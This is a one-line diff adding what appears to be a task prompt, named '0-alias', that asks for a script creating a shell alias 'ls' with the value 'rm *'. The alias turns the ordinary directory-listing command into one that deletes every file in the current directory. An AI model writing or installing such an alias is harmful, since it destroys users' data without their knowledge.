@@ -1,0 +1,1 @@
+0-alias - a script to Create a script that creates an alias. Name: ls Value: rm *
